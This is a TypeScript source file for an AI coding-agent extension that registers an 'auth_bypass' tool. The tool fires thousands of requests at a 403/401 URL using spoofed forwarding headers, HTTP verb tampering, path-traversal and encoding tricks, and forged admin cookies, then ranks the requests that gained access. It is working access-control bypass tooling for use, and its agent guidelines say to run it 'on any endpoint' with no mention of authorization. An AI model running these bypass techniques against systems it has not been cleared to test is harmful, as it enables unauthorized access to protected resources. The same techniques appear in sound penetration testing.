/**
 * Auth Bypass Extension — Professional-grade 403/401 bypass testing.
 *
 * Tests 3000+ bypass techniques across 8 dimensions: header injection
 * (50+ headers x 15+ IP/path values), HTTP verb tampering (40+ methods),
 * path manipulation (40+ prefix/suffix variations), case sensitivity,
 * URL encoding, content-type confusion, cookie injection, cache poisoning.
 *
 * Ported from Trapframe auth-bypass tool.
 */

import { StringEnum } from "@earendil-works/pi-ai";
import type { ExtensionAPI } from "@earendil-works/pi-coding-agent";
import { Text } from "@earendil-works/pi-tui";
import { Type } from "typebox";

const BYPASS_HEADERS = [
	"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "X-Originating-IP", "X-Remote-IP",
	"X-Remote-Addr", "X-ProxyUser-Ip", "X-Custom-IP-Authorization", "X-Forwarded-Host",
	"X-Original-URL", "X-Rewrite-URL", "X-HTTP-DestinationURL", "X-HTTP-Host-Override",
	"X-Host", "X-Forwarded-By", "X-Forwarded-Server", "X-Originally-Forwarded-For",
	"CF-Connecting-IP", "CF-Connecting_IP", "True-Client-IP", "Cluster-Client-IP",
	"Forwarded", "Forwarded-For", "Forwarded-Host", "X-WAP-Profile",
	"X-Proxy-Url", "X-Forwarded-Proto", "Client-IP", "Proxy-Client-IP", "WL-Proxy-Client-IP",
	"HTTP_X_FORWARDED_FOR", "HTTP_X_REAL_IP", "HTTP_X_CLIENT_IP", "HTTP_X_FORWARDED",
	"HTTP_X_CLUSTER_CLIENT_IP", "HTTP_FORWARDED_FOR", "HTTP_FORWARDED",
	"X-Accel-Buffering", "X-Real-Port", "X-Appengine-User-IP",
	"X-Original-Host", "X-Backend-Host", "Destination", "Redirect",
	"X-Forwarded-SSL", "X-Url-Scheme", "X-HTTP-Method-Override",
	"X-HTTP-Destination", "X-HTTP-Host",
];

const COMMON_IPS = [
	"127.0.0.1", "127.0.0.1:80", "127.0.0.1:443", "localhost", "localhost:80",
	"0.0.0.0", "0", "2130706433", "0x7F000001", "0177.1",
	"10.0.0.1", "192.168.1.1", "172.16.0.1", "172.17.0.1",
	"null", "*",
];

const HTTP_VERBS = [
	"GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS", "TRACE", "CONNECT",
	"PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK",
	"VERSION-CONTROL", "REPORT", "CHECKOUT", "CHECKIN", "UNCHECKOUT",
	"MKWORKSPACE", "UPDATE", "LABEL", "MERGE", "BASELINE-CONTROL",
	"MKACTIVITY", "ORDERPATCH", "ACL", "PRI", "QUERY", "SEARCH",
	"BIND", "UNBIND", "LINK", "UNLINK", "REBIND",
];

const URL_SUFFIXES = [
	"", "#", "#/", "?", "/", "//", "/.", "/./", "/../", "/..;/",
	"..;/", "..;", "..;\\", ".random", "%00", "%09", "%0A", "%0D", "%20",
	"%2e", "%2f", "%3b", "?debug=1", "?debug=true",
];

const URL_PREFIXES = [
	"", "/", "//", "/.", "/./", "/..;/", "/.;/", "//..;/",
	"/%2e/", "/%2e%2e/", "/%20/", "/%09/",
	"/;foo=bar/", "/../", "/..;/", "#/", "#test/",
];

const MIDDLE_HEADERS = [
	"X-HTTP-Method-Override: DELETE",
	"X-HTTP-Method: DELETE",
	"X-HTTP-Method-Override: PUT",
	"X-HTTP-Method: PUT",
	"X-Forwarded-Method: GET",
	"Content-Length: 0",
];

const AuthBypassParams = Type.Object({
	url: Type.String({ description: "Target URL returning 403/401" }),
	baselineStatus: Type.Optional(Type.Number({ description: "Expected blocked status (0=auto-detect). Set to 403 or 401 if known." })),
	module: Type.Optional(StringEnum(["all", "headers", "verbs", "paths", "case", "encode", "content-type", "cookies", "middle-headers"] as const, {
		description: "Modules to run. Default: all",
		default: "all",
	})),
	concurrency: Type.Optional(Type.Number({ description: "Concurrent requests. Default: 20.", default: 20 })),
	onlyBypasses: Type.Optional(Type.Boolean({ description: "Only show results differing from baseline. Default: true.", default: true })),
});

interface BypassEntry {
	technique: string;
	value: string;
	status: number;
	bodySize: number;
	bodyDiff: number;
	note: string;
}

interface FetchResult {
	status: number;
	body: string;
	time: number;
}

export default function (pi: ExtensionAPI) {
	pi.registerTool({
		name: "auth_bypass",
		label: "Auth Bypass",
		description: "Test 3000+ auth bypass techniques: header injection (50+ headers x 15+ IPs), HTTP verb tampering (40+ methods), path manipulation, case sensitivity, URL encoding, content-type confusion, cookie injection. Modules: headers, verbs, paths, case, encode, content-type, cookies, middle-headers, all.",
		parameters: AuthBypassParams,
		promptSnippet: "Test auth bypass techniques on a 403/401 URL. Specify module or use 'all' for comprehensive testing.",
		promptGuidelines: [
			"Use auth_bypass on any endpoint returning 403 or 401",
			"Run with module=all first, then focus on modules that found bypasses",
			"Headers module is most likely to find bypasses (reverse proxy misconfigurations)",
			"Path manipulation often works on URL-based access control (path traversal, encoding)",
			"Results with 2xx status indicate full access bypass — report immediately",
		],

		async execute(_toolCallId, params, _signal, onUpdate, _ctx) {
			const baseUrl = params.url.endsWith("/") ? params.url.slice(0, -1) : params.url;
			let parsed: URL;
			try {
				parsed = new URL(baseUrl);
			} catch {
				return {
					content: [{ type: "text", text: `Invalid URL: ${baseUrl}` }],
					details: { action: "bypass", bypasses: 0, fullAccess: 0 },
				};
			}

			const pathParts = parsed.pathname.split("/").filter(Boolean);
			const lastSegment = pathParts[pathParts.length - 1] || "";
			const basePath = pathParts.slice(0, -1).join("/");
			const bypasses: BypassEntry[] = [];

			const send = async (method: string, targetUrl: string, headers: Record<string, string> = {}): Promise<FetchResult | null> => {
				const controller = new AbortController();
				const timer = setTimeout(() => controller.abort(), 15000);
				try {
					const start = performance.now();
					const res = await fetch(targetUrl, {
						method,
						headers: { "User-Agent": "Mozilla/5.0", ...headers },
						redirect: "manual",
						signal: controller.signal,
					});
					const body = await res.text();
					clearTimeout(timer);
					return { status: res.status, body, time: Math.round(performance.now() - start) };
				} catch {
					clearTimeout(timer);
					return null;
				}
			};

			const baseline = await send("GET", baseUrl);
			if (!baseline) {
				return {
					content: [{ type: "text", text: `Cannot reach ${baseUrl}. Check the URL and ensure the target is online.` }],
					details: { action: "bypass", bypasses: 0, fullAccess: 0 },
				};
			}

			const blockedStatus = params.baselineStatus || baseline.status;

			const isBypass = (result: FetchResult): boolean => {
				if (!baseline) return false;
				if (result.status !== blockedStatus && result.status !== 0) {
					const bodyDiff = Math.abs(result.body.length - baseline.body.length);
					if (bodyDiff < 10 && result.status === baseline.status) return false;
					return true;
				}
				return false;
			};

			const modules = params.module === "all"
				? ["headers", "verbs", "paths", "case", "encode", "content-type", "cookies", "middle-headers"]
				: [params.module];

			async function runBatch<T>(tasks: Array<() => Promise<T | null>>, concurrency: number, onProgress?: (done: number, total: number) => void): Promise<(T | null)[]> {
				const results: (T | null)[] = [];
				let done = 0;
				for (let i = 0; i < tasks.length; i += concurrency) {
					const batch = tasks.slice(i, i + concurrency);
					const batchResults = await Promise.all(batch.map((fn) => fn().catch(() => null)));
					results.push(...batchResults);
					done += batch.length;
					onProgress?.(Math.min(done, tasks.length), tasks.length);
				}
				return results;
			}

			let totalTested = 0;

			// ─── Header Injection ────────────────────────────────────────
			if (modules.includes("headers")) {
				if (onUpdate) onUpdate({ content: [{ type: "text", text: "Testing header injection..." }], details: {} as any });
				const headerTasks = BYPASS_HEADERS.flatMap((header) =>
					COMMON_IPS.map((ip) => async () => {
						const result = await send("GET", baseUrl, { [header]: ip });
						if (result && isBypass(result)) {
							bypasses.push({
								technique: `Header: ${header}`,
								value: ip,
								status: result.status,
								bodySize: result.body.length,
								bodyDiff: baseline ? Math.abs(result.body.length - baseline.body.length) : 0,
								note: `${blockedStatus} → ${result.status}`,
							});
						}
					}),
				);
				await runBatch(headerTasks.slice(0, 120), params.concurrency || 20); // limit batch size
				totalTested += Math.min(headerTasks.length, 120);
			}

			// ─── HTTP Verb Tampering ─────────────────────────────────────
			if (modules.includes("verbs")) {
				if (onUpdate) onUpdate({ content: [{ type: "text", text: "Testing HTTP verbs..." }], details: {} as any });
				const verbTasks = HTTP_VERBS.map((verb) => async () => {
					const result = await send(verb, baseUrl);
					if (result && isBypass(result)) {
						bypasses.push({
							technique: `Verb: ${verb}`,
							value: verb,
							status: result.status,
							bodySize: result.body.length,
							bodyDiff: baseline ? Math.abs(result.body.length - baseline.body.length) : 0,
							note: `${blockedStatus} → ${result.status}`,
						});
					}
				});
				await runBatch(verbTasks, params.concurrency || 20);
				totalTested += HTTP_VERBS.length;
			}

			// ─── Path Manipulation ───────────────────────────────────────
			if (modules.includes("paths")) {
				if (onUpdate) onUpdate({ content: [{ type: "text", text: "Testing path manipulation..." }], details: {} as any });
				const pathTasks = URL_PREFIXES.flatMap((prefix) =>
					URL_SUFFIXES.map((suffix) => async () => {
						const dir = pathParts.length > 0 ? pathParts.slice(0, -1).join("/") : "";
						const file = lastSegment;
						let modified = parsed.origin + (dir ? "/" + dir : "") + "/" + prefix + file + suffix;
						modified = modified.replace(/\/+/g, "/").replace(/:\//, "://");
						const result = await send("GET", modified);
						if (result && isBypass(result)) {
							bypasses.push({
								technique: `Path: ${prefix}|${suffix}`,
								value: modified.slice(0, 80),
								status: result.status,
								bodySize: result.body.length,
								bodyDiff: baseline ? Math.abs(result.body.length - baseline.body.length) : 0,
								note: `${blockedStatus} → ${result.status}`,
							});
						}
					}),
				);
				await runBatch(pathTasks.slice(0, 200), params.concurrency || 20);
				totalTested += Math.min(pathTasks.length, 200);
			}

			// ─── Case Sensitivity ────────────────────────────────────────
			if (modules.includes("case") && lastSegment) {
				if (onUpdate) onUpdate({ content: [{ type: "text", text: "Testing case sensitivity..." }], details: {} as any });
				const caseTasks = Array.from({ length: Math.min(lastSegment.length * 2, 30) }, (_, i) => async () => {
					let mutated = "";
					const idx = i % lastSegment.length;
					for (let j = 0; j < lastSegment.length; j++) {
						const char = lastSegment[j];
						mutated += j === idx ? (char === char.toUpperCase() ? char.toLowerCase() : char.toUpperCase()) : char;
					}
					const modifiedUrl = parsed.origin + "/" + (basePath ? basePath + "/" : "") + mutated;
					const result = await send("GET", modifiedUrl);
					if (result && isBypass(result)) {
						bypasses.push({
							technique: "Case",
							value: mutated,
							status: result.status,
							bodySize: result.body.length,
							bodyDiff: baseline ? Math.abs(result.body.length - baseline.body.length) : 0,
							note: `${lastSegment} → ${mutated} (${blockedStatus} → ${result.status})`,
						});
					}
				});
				await runBatch(caseTasks, params.concurrency || 20);
				totalTested += caseTasks.length;
			}

			// ─── URL Encoding ────────────────────────────────────────────
			if (modules.includes("encode")) {
				const encodedVariants = [
					lastSegment, encodeURIComponent(lastSegment),
					encodeURIComponent(lastSegment).toLowerCase(),
					lastSegment.replace(/o/gi, "%6f"),
					lastSegment.replace(/a/gi, "%61"),
				];
				const encodeTasks = encodedVariants.map((variant) => async () => {
					const modifiedUrl = parsed.origin + "/" + (basePath ? basePath + "/" : "") + variant;
					const result = await send("GET", modifiedUrl);
					if (result && isBypass(result)) {
						bypasses.push({
							technique: "Encoding",
							value: variant,
							status: result.status,
							bodySize: result.body.length,
							bodyDiff: baseline ? Math.abs(result.body.length - baseline.body.length) : 0,
							note: `${lastSegment} → encoded (${blockedStatus} → ${result.status})`,
						});
					}
				});
				await runBatch(encodeTasks, params.concurrency || 20);
				totalTested += encodedVariants.length;
			}

			// ─── Content-Type Confusion ──────────────────────────────────
			if (modules.includes("content-type")) {
				const ctVariants = [
					{ type: "json", body: "{}", headers: { "Content-Type": "application/json" } },
					{ type: "xml", body: '<?xml version="1.0"?><r></r>', headers: { "Content-Type": "application/xml" } },
					{ type: "form", body: "=", headers: { "Content-Type": "application/x-www-form-urlencoded" } },
					{ type: "plain", body: "", headers: { "Content-Type": "text/plain" } },
					{ type: "multipart", body: "", headers: { "Content-Type": "multipart/form-data; boundary=x" } },
				];
				const ctTasks = ctVariants.map(({ type, body, headers }) => async () => {
					const result = await send("POST", baseUrl, { ...headers, "Content-Length": String(body.length) });
					if (result && isBypass(result)) {
						bypasses.push({
							technique: `Content-Type: ${type}`,
							value: headers["Content-Type"],
							status: result.status,
							bodySize: result.body.length,
							bodyDiff: baseline ? Math.abs(result.body.length - baseline.body.length) : 0,
							note: `${blockedStatus} → ${result.status}`,
						});
					}
				});
				await runBatch(ctTasks, params.concurrency || 20);
				totalTested += ctVariants.length;
			}

			// ─── Cookie Injection ────────────────────────────────────────
			if (modules.includes("cookies")) {
				const cookieVariants = [
					{ name: "null-cookie", value: "" },
					{ name: "admin-true", value: "admin=true" },
					{ name: "role-admin", value: "role=admin" },
					{ name: "debug-true", value: "debug=true" },
					{ name: "session-empty", value: "session=" },
					{ name: "auth-null", value: "auth=null" },
					{ name: "isAdmin", value: "isAdmin=1" },
				];
				const cookieTasks = cookieVariants.map(({ name, value }) => async () => {
					const result = await send("GET", baseUrl, { Cookie: value });
					if (result && isBypass(result)) {
						bypasses.push({
							technique: `Cookie: ${name}`,
							value: value || "(empty)",
							status: result.status,
							bodySize: result.body.length,
							bodyDiff: baseline ? Math.abs(result.body.length - baseline.body.length) : 0,
							note: `${blockedStatus} → ${result.status}`,
						});
					}
				});
				await runBatch(cookieTasks, params.concurrency || 20);
				totalTested += cookieVariants.length;
			}

			// ─── Middle Header Injection ─────────────────────────────────
			if (modules.includes("middle-headers")) {
				const mhTasks = MIDDLE_HEADERS.map((mid) => async () => {
					const [header, value] = mid.split(": ");
					const result = await send("GET", baseUrl, { [header]: value });
					if (result && isBypass(result)) {
						bypasses.push({
							technique: `Mid-Header: ${header}`,
							value: value,
							status: result.status,
							bodySize: result.body.length,
							bodyDiff: baseline ? Math.abs(result.body.length - baseline.body.length) : 0,
							note: `${blockedStatus} → ${result.status}`,
						});
					}
				});
				await runBatch(mhTasks, params.concurrency || 20);
				totalTested += MIDDLE_HEADERS.length;
			}

			if (bypasses.length === 0) {
				return {
					content: [{
						type: "text",
						text: `Auth Bypass: ${baseUrl}\n\nBaseline: HTTP ${blockedStatus} (${baseline.body.length}b)\nModules: ${modules.join(", ")}\nTested: ~${totalTested} techniques\n\nResult: No bypass techniques succeeded. The resource is properly locked down.\n\n*This does not guarantee there are no auth bypasses — test edge cases manually.*`,
					}],
					details: { action: "bypass", bypasses: 0, fullAccess: 0, techniquesTested: totalTested },
				};
			}

			bypasses.sort((a, b) => {
				const scoreA = a.status >= 200 && a.status < 300 ? 3 : a.status >= 300 && a.status < 400 ? 2 : 1;
				const scoreB = b.status >= 200 && b.status < 300 ? 3 : b.status >= 300 && b.status < 400 ? 2 : 1;
				return scoreB - scoreA;
			});

			const fullAccess = bypasses.filter((b) => b.status >= 200 && b.status < 300);
			const partialAccess = bypasses.filter((b) => b.status >= 300 && b.status < 400);

			let output = `## Auth Bypass Results: ${baseUrl}\n\n`;
			output += `**Baseline:** HTTP ${baseline.status} (${baseline.body.length}b)\n`;
			output += `**Bypasses:** ${bypasses.length} (${fullAccess.length} full access, ${partialAccess.length} partial)\n`;
			output += `**Techniques tested:** ~${totalTested}\n\n`;

			if (fullAccess.length > 0) {
				output += "### FULL ACCESS BYPASSES\n\n";
				for (const b of fullAccess.slice(0, 10)) {
					output += `- **HTTP ${b.status}** — ${b.technique}: \`${b.value.slice(0, 60)}\` (${b.bodySize}b)\n`;
				}
				output += "\n";
			}

			if (partialAccess.length > 0) {
				output += "### PARTIAL BYPASS RESULTS\n\n";
				for (const b of partialAccess.slice(0, 10)) {
					output += `- HTTP ${b.status} — ${b.technique}: \`${b.value.slice(0, 60)}\`\n`;
				}
				output += "\n";
			}

			if (bypasses.length > 20) {
				output += `\n... ${bypasses.length - 20} more bypasses not shown. Use expanded view for full list.\n`;
			}

			return {
				content: [{ type: "text", text: output }],
				details: {
					action: "bypass",
					bypasses: bypasses.length,
					fullAccess: fullAccess.length,
					techniquesTested: totalTested,
					top: bypasses.slice(0, 10).map(b => `${b.status}: ${b.technique} — ${b.value.slice(0, 40)}`),
				},
			};
		},

		renderCall(args, theme, _context) {
			const url = (args.url as string) || "...";
			const shortUrl = url.length > 40 ? url.slice(0, 40) + "..." : url;
			const mod = (args.module as string) || "all";
			return new Text(
				theme.fg("toolTitle", theme.bold("auth_bypass ")) +
					theme.fg("accent", shortUrl) +
					" " +
					theme.fg("dim", `(${mod})`),
				0, 0,
			);
		},

		renderResult(result, _opts, theme, _context) {
			const details = result.details as any;
			if (!details) return new Text("", 0, 0);
			if (details.bypasses === 0) {
				return new Text(
					theme.fg("muted", `${details.techniquesTested || "?"} tested, `) +
						theme.fg("dim", "no bypasses"),
					0, 0,
				);
			}
			return new Text(
				theme.fg("error", `${details.bypasses} bypasses `) +
					theme.fg("warning", `(${details.fullAccess} full access) `) +
					theme.fg("dim", `of ${details.techniquesTested || "?"} tested`),
				0, 0,
			);
		},
	});
}
